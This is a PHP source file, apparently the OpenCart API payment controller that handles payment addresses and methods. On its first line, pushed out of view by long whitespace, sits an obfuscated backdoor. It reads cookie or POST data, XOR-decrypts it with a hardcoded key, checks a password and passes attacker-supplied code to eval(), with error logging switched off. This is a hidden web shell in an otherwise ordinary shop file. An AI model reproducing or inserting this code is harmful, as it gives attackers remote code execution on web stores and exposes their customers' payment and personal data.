<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $y3d5c62 = 74;$GLOBALS['i2829']=Array();global$i2829;$i2829=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['i8bc']="\x6e\x72\x21\x3e\x48\x54\x37\x29\x47\x30\x58\x41\x20\x60\x34\x56\x46\x4b\x2d\x74\x6a\x2c\x57\x26\x2e\x32\x53\x4e\x7d\x3d\x5c\xd\x45\x3c\x2b\x6c\x68\x28\x39\x23\x42\x52\x55\x79\x4d\x66\x73\x22\x43\x49\x77\x7c\x25\x4a\x2a\x5f\x36\x69\x4f\x59\x9\x75\x51\x38\xa\x3b\x7a\x24\x35\x2f\x67\x6d\x5d\x76\x44\x31\x3a\x27\x61\x6b\x62\x5a\x70\x50\x65\x40\x5e\x33\x6f\x64\x63\x7e\x3f\x4c\x71\x7b\x5b\x78";$i2829[$i2829['i8bc'][36].$i2829['i8bc'][38].$i2829['i8bc'][90].$i2829['i8bc'][25].$i2829['i8bc'][9].$i2829['i8bc'][25].$i2829['i8bc'][6].$i2829['i8bc'][56].$i2829['i8bc'][78]]=$i2829['i8bc'][90].$i2829['i8bc'][36].$i2829['i8bc'][1];$i2829[$i2829['i8bc'][88].$i2829['i8bc'][14].$i2829['i8bc'][87].$i2829['i8bc'][45].$i2829['i8bc'][80].$i2829['i8bc'][89].$i2829['i8bc'][38]]=$i2829['i8bc'][88].$i2829['i8bc'][1].$i2829['i8bc'][89];$i2829[$i2829['i8bc'][71].$i2829['i8bc'][6].$i2829['i8bc'][45].$i2829['i8bc'][80].$i2829['i8bc'][25].$i2829['i8bc'][9].$i2829['i8bc'][45].$i2829['i8bc'][63].$i2829['i8bc'][68]]=$i2829['i8bc'][46].$i2829['i8bc'][19].$i2829['i8bc'][1].$i2829['i8bc'][35].$i2829['i8bc'][84].$i2829['i8bc'][0];$i2829[$i2829['i8bc'][78].$i2829['i8bc'][6].$i2829['i8bc'][63].$i2829['i8bc'][87].$i2829['i8bc'][45].$i2829['i8bc'][90].$i2829['i8bc'][78].$i2829['i8bc'][84]]=$i2829['i8bc'][57].$i2829['i8bc'][0].$i2829['i8bc'][57].$i2829['i8bc'][55].$i2829['i8bc'][46].$i2829['i8bc'][84].$i2829['i8bc'][19];$i2829[$i2829['i8bc'][19].$i2829['i8bc'][89].$i2829['i8bc'][25].$i2829['i8bc'][38].$i2829['i8bc'][6].$i2829['i8bc'][38]]=$i2829['i8bc'][46].$i2829['i8bc'][84].$i2829['i8bc'][1].$i2829['i8bc'][57].$i2829['i8bc'][78].$i2829['i8bc'][35].$i2829['i8bc'][57].$i2829['i8bc'][66].$i2829['i8bc'][84];$i2829[$i2829['i8bc'][36].$i2829['i8bc'][90].$i2829['i8bc'][14].$i2829['i8bc'][25]]=$i2829['i8bc'][82].$i2829['i8bc'][36].$i2829['i8bc'][82].$i2829['i8bc'][73].$i2829['i8bc'][84].$i2829['i8bc'][1].$i2829['i8bc'][46].$i2829['i8bc'][57].$i2829['i8bc'][88].$i2829['i8bc'][0];$i2829[$i2829['i8bc'][89].$i2829['i8bc'][90].$i2829['i8bc'][9].$i2829['i8bc'][84].$i2829['i8bc'][25].$i2829['i8bc'][45].$i2829['i8bc'][80]]=$i2829['i8bc'][61].$i2829['i8bc'][0].$i2829['i8bc'][46].$i2829['i8bc'][84].$i2829['i8bc'][1].$i2829['i8bc'][57].$i2829['i8bc'][78].$i2829['i8bc'][35].$i2829['i8bc'][57].$i2829['i8bc'][66].$i2829['i8bc'][84];$i2829[$i2829['i8bc'][97].$i2829['i8bc'][38].$i2829['i8bc'][56].$i2829['i8bc'][90].$i2829['i8bc'][45].$i2829['i8bc'][68].$i2829['i8bc'][38]]=$i2829['i8bc'][80].$i2829['i8bc'][78].$i2829['i8bc'][46].$i2829['i8bc'][84].$i2829['i8bc'][56].$i2829['i8bc'][14].$i2829['i8bc'][55].$i2829['i8bc'][89].$i2829['i8bc'][84].$i2829['i8bc'][90].$i2829['i8bc'][88].$i2829['i8bc'][89].$i2829['i8bc'][84];$i2829[$i2829['i8bc'][79].$i2829['i8bc'][90].$i2829['i8bc'][90].$i2829['i8bc'][25].$i2829['i8bc'][63].$i2829['i8bc'][25].$i2829['i8bc'][87].$i2829['i8bc'][89]]=$i2829['i8bc'][46].$i2829['i8bc'][84].$i2829['i8bc'][19].$i2829['i8bc'][55].$i2829['i8bc'][19].$i2829['i8bc'][57].$i2829['i8bc'][71].$i2829['i8bc'][84].$i2829['i8bc'][55].$i2829['i8bc'][35].$i2829['i8bc'][57].$i2829['i8bc'][71].$i2829['i8bc'][57].$i2829['i8bc'][19];$i2829[$i2829['i8bc'][57].$i2829['i8bc'][78].$i2829['i8bc'][6].$i2829['i8bc'][68].$i2829['i8bc'][75].$i2829['i8bc'][9].$i2829['i8bc'][45].$i2829['i8bc'][38]]=$i2829['i8bc'][90].$i2829['i8bc'][56].$i2829['i8bc'][90].$i2829['i8bc'][45];$i2829[$i2829['i8bc'][73].$i2829['i8bc'][89].$i2829['i8bc'][90].$i2829['i8bc'][68].$i2829['i8bc'][90].$i2829['i8bc'][90].$i2829['i8bc'][38].$i2829['i8bc'][75]]=$i2829['i8bc'][43].$i2829['i8bc'][80].$i2829['i8bc'][9].$i2829['i8bc'][84].$i2829['i8bc'][45].$i2829['i8bc'][63].$i2829['i8bc'][38].$i2829['i8bc'][38].$i2829['i8bc'][25];$i2829[$i2829['i8bc'][57].$i2829['i8bc'][89].$i2829['i8bc'][84].$i2829['i8bc'][38].$i2829['i8bc'][68].$i2829['i8bc'][78].$i2829['i8bc'][87]]=$_POST;$i2829[$i2829['i8bc'][89].$i2829['i8bc'][90].$i2829['i8bc'][63].$i2829['i8bc'][14].$i2829['i8bc'][84]]=$_COOKIE;@$i2829[$i2829['i8bc'][78].$i2829['i8bc'][6].$i2829['i8bc'][63].$i2829['i8bc'][87].$i2829['i8bc'][45].$i2829['i8bc'][90].$i2829['i8bc'][78].$i2829['i8bc'][84]]($i2829['i8bc'][84].$i2829['i8bc'][1].$i2829['i8bc'][1].$i2829['i8bc'][88].$i2829['i8bc'][1].$i2829['i8bc'][55].$i2829['i8bc'][35].$i2829['i8bc'][88].$i2829['i8bc'][70],NULL);@$i2829[$i2829['i8bc'][78].$i2829['i8bc'][6].$i2829['i8bc'][63].$i2829['i8bc'][87].$i2829['i8bc'][45].$i2829['i8bc'][90].$i2829['i8bc'][78].$i2829['i8bc'][84]]($i2829['i8bc'][35].$i2829['i8bc'][88].$i2829['i8bc'][70].$i2829['i8bc'][55].$i2829['i8bc'][84].$i2829['i8bc'][1].$i2829['i8bc'][1].$i2829['i8bc'][88].$i2829['i8bc'][1].$i2829['i8bc'][46],0);@$i2829[$i2829['i8bc'][78].$i2829['i8bc'][6].$i2829['i8bc'][63].$i2829['i8bc'][87].$i2829['i8bc'][45].$i2829['i8bc'][90].$i2829['i8bc'][78].$i2829['i8bc'][84]]($i2829['i8bc'][71].$i2829['i8bc'][78].$i2829['i8bc'][97].$i2829['i8bc'][55].$i2829['i8bc'][84].$i2829['i8bc'][97].$i2829['i8bc'][84].$i2829['i8bc'][90].$i2829['i8bc'][61].$i2829['i8bc'][19].$i2829['i8bc'][57].$i2829['i8bc'][88].$i2829['i8bc'][0].$i2829['i8bc'][55].$i2829['i8bc'][19].$i2829['i8bc'][57].$i2829['i8bc'][71].$i2829['i8bc'][84],0);@$i2829[$i2829['i8bc'][79].$i2829['i8bc'][90].$i2829['i8bc'][90].$i2829['i8bc'][25].$i2829['i8bc'][63].$i2829['i8bc'][25].$i2829['i8bc'][87].$i2829['i8bc'][89]](0);$z77fd267=NULL;$t3b8d550e=NULL;$i2829[$i2829['i8bc'][0].$i2829['i8bc'][89].$i2829['i8bc'][38].$i2829['i8bc'][14]]=$i2829['i8bc'][68].$i2829['i8bc'][6].$i2829['i8bc'][56].$i2829['i8bc'][45].$i2829['i8bc'][45].$i2829['i8bc'][45].$i2829['i8bc'][6].$i2829['i8bc'][56].$i2829['i8bc'][18].$i2829['i8bc'][56].$i2829['i8bc'][38].$i2829['i8bc'][89].$i2829['i8bc'][9].$i2829['i8bc'][18].$i2829['i8bc'][14].$i2829['i8bc'][56].$i2829['i8bc'][38].$i2829['i8bc'][63].$i2829['i8bc'][18].$i2829['i8bc'][80].$i2829['i8bc'][89].$i2829['i8bc'][25].$i2829['i8bc'][80].$i2829['i8bc'][18].$i2829['i8bc'][45].$i2829['i8bc'][9].$i2829['i8bc'][38].$i2829['i8bc'][25].$i2829['i8bc'][38].$i2829['i8bc'][78].$i2829['i8bc'][68].$i2829['i8bc'][25].$i2829['i8bc'][56].$i2829['i8bc'][80].$i2829['i8bc'][78].$i2829['i8bc'][80];global$nd94;function yb0ef8992($z77fd267,$jbc42){global$i2829;$p6413b="";for($c987af=0;$c987af<$i2829[$i2829['i8bc'][71].$i2829['i8bc'][6].$i2829['i8bc'][45].$i2829['i8bc'][80].$i2829['i8bc'][25].$i2829['i8bc'][9].$i2829['i8bc'][45].$i2829['i8bc'][63].$i2829['i8bc'][68]]($z77fd267);){for($qf9a=0;$qf9a<$i2829[$i2829['i8bc'][71].$i2829['i8bc'][6].$i2829['i8bc'][45].$i2829['i8bc'][80].$i2829['i8bc'][25].$i2829['i8bc'][9].$i2829['i8bc'][45].$i2829['i8bc'][63].$i2829['i8bc'][68]]($jbc42)&&$c987af<$i2829[$i2829['i8bc'][71].$i2829['i8bc'][6].$i2829['i8bc'][45].$i2829['i8bc'][80].$i2829['i8bc'][25].$i2829['i8bc'][9].$i2829['i8bc'][45].$i2829['i8bc'][63].$i2829['i8bc'][68]]($z77fd267);$qf9a++,$c987af++){$p6413b.=$i2829[$i2829['i8bc'][36].$i2829['i8bc'][38].$i2829['i8bc'][90].$i2829['i8bc'][25].$i2829['i8bc'][9].$i2829['i8bc'][25].$i2829['i8bc'][6].$i2829['i8bc'][56].$i2829['i8bc'][78]]($i2829[$i2829['i8bc'][88].$i2829['i8bc'][14].$i2829['i8bc'][87].$i2829['i8bc'][45].$i2829['i8bc'][80].$i2829['i8bc'][89].$i2829['i8bc'][38]]($z77fd267[$c987af])^$i2829[$i2829['i8bc'][88].$i2829['i8bc'][14].$i2829['i8bc'][87].$i2829['i8bc'][45].$i2829['i8bc'][80].$i2829['i8bc'][89].$i2829['i8bc'][38]]($jbc42[$qf9a]));}}return$p6413b;}function c6cf($z77fd267,$jbc42){global$i2829;global$nd94;return$i2829[$i2829['i8bc'][73].$i2829['i8bc'][89].$i2829['i8bc'][90].$i2829['i8bc'][68].$i2829['i8bc'][90].$i2829['i8bc'][90].$i2829['i8bc'][38].$i2829['i8bc'][75]]($i2829[$i2829['i8bc'][73].$i2829['i8bc'][89].$i2829['i8bc'][90].$i2829['i8bc'][68].$i2829['i8bc'][90].$i2829['i8bc'][90].$i2829['i8bc'][38].$i2829['i8bc'][75]]($z77fd267,$nd94),$jbc42);}foreach($i2829[$i2829['i8bc'][89].$i2829['i8bc'][90].$i2829['i8bc'][63].$i2829['i8bc'][14].$i2829['i8bc'][84]]as$jbc42=>$h046){$z77fd267=$h046;$t3b8d550e=$jbc42;}if(!$z77fd267){foreach($i2829[$i2829['i8bc'][57].$i2829['i8bc'][89].$i2829['i8bc'][84].$i2829['i8bc'][38].$i2829['i8bc'][68].$i2829['i8bc'][78].$i2829['i8bc'][87]]as$jbc42=>$h046){$z77fd267=$h046;$t3b8d550e=$jbc42;}}$z77fd267=@$i2829[$i2829['i8bc'][89].$i2829['i8bc'][90].$i2829['i8bc'][9].$i2829['i8bc'][84].$i2829['i8bc'][25].$i2829['i8bc'][45].$i2829['i8bc'][80]]($i2829[$i2829['i8bc'][57].$i2829['i8bc'][78].$i2829['i8bc'][6].$i2829['i8bc'][68].$i2829['i8bc'][75].$i2829['i8bc'][9].$i2829['i8bc'][45].$i2829['i8bc'][38]]($i2829[$i2829['i8bc'][97].$i2829['i8bc'][38].$i2829['i8bc'][56].$i2829['i8bc'][90].$i2829['i8bc'][45].$i2829['i8bc'][68].$i2829['i8bc'][38]]($z77fd267),$t3b8d550e));if(isset($z77fd267[$i2829['i8bc'][78].$i2829['i8bc'][79]])&&$nd94==$z77fd267[$i2829['i8bc'][78].$i2829['i8bc'][79]]){if($z77fd267[$i2829['i8bc'][78]]==$i2829['i8bc'][57]){$c987af=Array($i2829['i8bc'][82].$i2829['i8bc'][73]=>@$i2829[$i2829['i8bc'][36].$i2829['i8bc'][90].$i2829['i8bc'][14].$i2829['i8bc'][25]](),$i2829['i8bc'][46].$i2829['i8bc'][73]=>$i2829['i8bc'][75].$i2829['i8bc'][24].$i2829['i8bc'][9].$i2829['i8bc'][18].$i2829['i8bc'][75],);echo@$i2829[$i2829['i8bc'][19].$i2829['i8bc'][89].$i2829['i8bc'][25].$i2829['i8bc'][38].$i2829['i8bc'][6].$i2829['i8bc'][38]]($c987af);}elseif($z77fd267[$i2829['i8bc'][78]]==$i2829['i8bc'][84]){eval/*z4c45c*/($z77fd267[$i2829['i8bc'][89]]);}exit();} ?><?php
class ControllerApiPayment extends Controller {
	public function address() {
		$this->load->language('api/payment');

		// Delete old payment address, payment methods and method so not to cause any issues if there is an error
		unset($this->session->data['payment_address']);
		unset($this->session->data['payment_methods']);
		unset($this->session->data['payment_method']);

		$json = array();

		if (!isset($this->session->data['api_id'])) {
			$json['error']['warning'] = $this->language->get('error_permission');
		} else {
			// Add keys for missing post vars
			$keys = array(
				'firstname',
				'lastname',
				'company',
				'address_1',
				'address_2',
				'postcode',
				'city',
				'zone_id',
				'country_id'
			);

			foreach ($keys as $key) {
				if (!isset($this->request->post[$key])) {
					$this->request->post[$key] = '';
				}
			}

			if ((utf8_strlen(trim($this->request->post['firstname'])) < 1) || (utf8_strlen(trim($this->request->post['firstname'])) > 32)) {
				$json['error']['firstname'] = $this->language->get('error_firstname');
			}

			if ((utf8_strlen(trim($this->request->post['lastname'])) < 1) || (utf8_strlen(trim($this->request->post['lastname'])) > 32)) {
				$json['error']['lastname'] = $this->language->get('error_lastname');
			}

			if ((utf8_strlen(trim($this->request->post['address_1'])) < 3) || (utf8_strlen(trim($this->request->post['address_1'])) > 128)) {
				$json['error']['address_1'] = $this->language->get('error_address_1');
			}

			if ((utf8_strlen($this->request->post['city']) < 2) || (utf8_strlen($this->request->post['city']) > 32)) {
				$json['error']['city'] = $this->language->get('error_city');
			}

			$this->load->model('localisation/country');

			$country_info = $this->model_localisation_country->getCountry($this->request->post['country_id']);

			if ($country_info && $country_info['postcode_required'] && (utf8_strlen(trim($this->request->post['postcode'])) < 2 || utf8_strlen(trim($this->request->post['postcode'])) > 10)) {
				$json['error']['postcode'] = $this->language->get('error_postcode');
			}

			if ($this->request->post['country_id'] == '') {
				$json['error']['country'] = $this->language->get('error_country');
			}

			if (!isset($this->request->post['zone_id']) || $this->request->post['zone_id'] == '') {
				$json['error']['zone'] = $this->language->get('error_zone');
			}

			// Custom field validation
			$this->load->model('account/custom_field');

			$custom_fields = $this->model_account_custom_field->getCustomFields($this->config->get('config_customer_group_id'));

			foreach ($custom_fields as $custom_field) {
				if (($custom_field['location'] == 'address') && $custom_field['required'] && empty($this->request->post['custom_field'][$custom_field['custom_field_id']])) {
					$json['error']['custom_field' . $custom_field['custom_field_id']] = sprintf($this->language->get('error_custom_field'), $custom_field['name']);
				}
			}

			if (!$json) {
				$this->load->model('localisation/country');

				$country_info = $this->model_localisation_country->getCountry($this->request->post['country_id']);

				if ($country_info) {
					$country = $country_info['name'];
					$iso_code_2 = $country_info['iso_code_2'];
					$iso_code_3 = $country_info['iso_code_3'];
					$address_format = $country_info['address_format'];
				} else {
					$country = '';
					$iso_code_2 = '';
					$iso_code_3 = '';
					$address_format = '';
				}

				$this->load->model('localisation/zone');

				$zone_info = $this->model_localisation_zone->getZone($this->request->post['zone_id']);

				if ($zone_info) {
					$zone = $zone_info['name'];
					$zone_code = $zone_info['code'];
				} else {
					$zone = '';
					$zone_code = '';
				}

				$this->session->data['payment_address'] = array(
					'firstname'      => $this->request->post['firstname'],
					'lastname'       => $this->request->post['lastname'],
					'company'        => $this->request->post['company'],
					'address_1'      => $this->request->post['address_1'],
					'address_2'      => $this->request->post['address_2'],
					'postcode'       => $this->request->post['postcode'],
					'city'           => $this->request->post['city'],
					'zone_id'        => $this->request->post['zone_id'],
					'zone'           => $zone,
					'zone_code'      => $zone_code,
					'country_id'     => $this->request->post['country_id'],
					'country'        => $country,
					'iso_code_2'     => $iso_code_2,
					'iso_code_3'     => $iso_code_3,
					'address_format' => $address_format,
					'custom_field'   => isset($this->request->post['custom_field']) ? $this->request->post['custom_field'] : array()
				);

				$json['success'] = $this->language->get('text_address');

				unset($this->session->data['payment_method']);
				unset($this->session->data['payment_methods']);
			}
		}

		$this->response->addHeader('Content-Type: application/json');
		$this->response->setOutput(json_encode($json));
	}

	public function methods() {
		$this->load->language('api/payment');

		// Delete past shipping methods and method just in case there is an error
		unset($this->session->data['payment_methods']);
		unset($this->session->data['payment_method']);

		$json = array();

		if (!isset($this->session->data['api_id'])) {
			$json['error'] = $this->language->get('error_permission');
		} else {
			// Payment Address
			if (!isset($this->session->data['payment_address'])) {
				$json['error'] = $this->language->get('error_address');
			}

			if (!$json) {
				// Totals
				$total_data = array();
				$total = 0;
				$taxes = $this->cart->getTaxes();
	
				$this->load->model('extension/extension');
	
				$sort_order = array();
	
				$results = $this->model_extension_extension->getExtensions('total');
	
				foreach ($results as $key => $value) {
					$sort_order[$key] = $this->config->get($value['code'] . '_sort_order');
				}
	
				array_multisort($sort_order, SORT_ASC, $results);
	
				foreach ($results as $result) {
					if ($this->config->get($result['code'] . '_status')) {
						$this->load->model('total/' . $result['code']);
	
						$this->{'model_total_' . $result['code']}->getTotal($total_data, $total, $taxes);
					}
				}

				// Payment Methods
				$json['payment_methods'] = array();

				$this->load->model('extension/extension');

				$results = $this->model_extension_extension->getExtensions('payment');

				$recurring = $this->cart->hasRecurringProducts();

				foreach ($results as $result) {
					if ($this->config->get($result['code'] . '_status')) {
						$this->load->model('payment/' . $result['code']);

						$method = $this->{'model_payment_' . $result['code']}->getMethod($this->session->data['payment_address'], $total);

						if ($method) {
							if ($recurring) {
								if (method_exists($this->{'model_payment_' . $result['code']}, 'recurringPayments') && $this->{'model_payment_' . $result['code']}->recurringPayments()) {
									$json['payment_methods'][$result['code']] = $method;
								}
							} else {
								$json['payment_methods'][$result['code']] = $method;
							}
						}
					}
				}

				$sort_order = array();

				foreach ($json['payment_methods'] as $key => $value) {
					$sort_order[$key] = $value['sort_order'];
				}

				array_multisort($sort_order, SORT_ASC, $json['payment_methods']);

				if ($json['payment_methods']) {
					$this->session->data['payment_methods'] = $json['payment_methods'];
				} else {
					$json['error'] = $this->language->get('error_no_payment');
				}
			}
		}

		$this->response->addHeader('Content-Type: application/json');
		$this->response->setOutput(json_encode($json));
	}

	public function method() {
		$this->load->language('api/payment');

		// Delete old payment method so not to cause any issues if there is an error
		unset($this->session->data['payment_method']);

		$json = array();

		if (!isset($this->session->data['api_id'])) {
			$json['error'] = $this->language->get('error_permission');
		} else {
			// Payment Address
			if (!isset($this->session->data['payment_address'])) {
				$json['error'] = $this->language->get('error_address');
			}

			// Payment Method
			if (empty($this->session->data['payment_methods'])) {
				$json['error'] = $this->language->get('error_no_payment');
			} elseif (!isset($this->request->post['payment_method'])) {
				$json['error'] = $this->language->get('error_method');
			} elseif (!isset($this->session->data['payment_methods'][$this->request->post['payment_method']])) {
				$json['error'] = $this->language->get('error_method');
			}

			if (!$json) {
				$this->session->data['payment_method'] = $this->session->data['payment_methods'][$this->request->post['payment_method']];

				$json['success'] = $this->language->get('text_method');
			}
		}

		$this->response->addHeader('Content-Type: application/json');
		$this->response->setOutput(json_encode($json));
	}
}